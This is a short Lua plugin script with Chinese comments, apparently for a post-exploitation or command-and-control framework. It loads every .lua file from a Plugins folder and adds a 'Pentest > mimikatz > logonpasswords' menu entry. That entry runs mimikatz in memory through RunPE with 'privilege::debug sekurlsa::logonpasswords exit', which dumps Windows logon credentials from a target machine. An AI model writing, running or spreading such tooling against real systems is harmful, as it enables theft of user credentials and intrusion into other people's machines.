-- 获取当前脚本的完整路径
local scriptPath = debug.getinfo(1, "S").source

-- 检查是否成功获取路径
if scriptPath:sub(1, 1) == "@" then
    scriptPath = scriptPath:sub(2)
else
    -- 如果不能获取正确路径，使用备用方法
    scriptPath = arg and arg[0] or "."
end

-- 提取目录路径
local scriptDir = scriptPath:match("(.*/)")
if scriptDir == nil then
    -- 处理 Windows 上的反斜杠路径
    scriptDir = scriptPath:match("(.*\\)")
end

if scriptDir == nil then
    MessageBoxA("Error: Failed to determine script directory")
else
    -- 拼接 Plugins 目录路径
    local pluginsDir = scriptDir .. "Plugins/"


    -- 遍历 Plugins 目录下的所有文件
    local pfile = io.popen('dir "' .. pluginsDir .. '" /b')
    for filename in pfile:lines() do
        if filename:match("%.lua$") then
            local filePath = pluginsDir .. filename
            print("Loading: " .. filePath) -- 调试输出
            dofile(filePath)
        end
    end
    pfile:close()
end
local function logonpasswords()
    RunPE(mimikatz, "privilege::debug sekurlsa::logonpasswords exit")
    Sessionlog("Task to run mimikatz , args is 'privilege::debug sekurlsa::logonpasswords exit'")
end

AddMenuItemA("Pentest", null)
AddMenuItemA("mimikatz", null) --
AddMenuItemB("logonpasswords", null, logonpasswords)

local menuStructure = {
    ["Pentest"] = { "mimikatz" },
    ["mimikatz"] = { "logonpasswords" },
}
for parent, subs in pairs(menuStructure) do AddMenuItemsAsSubItems(parent, subs) end
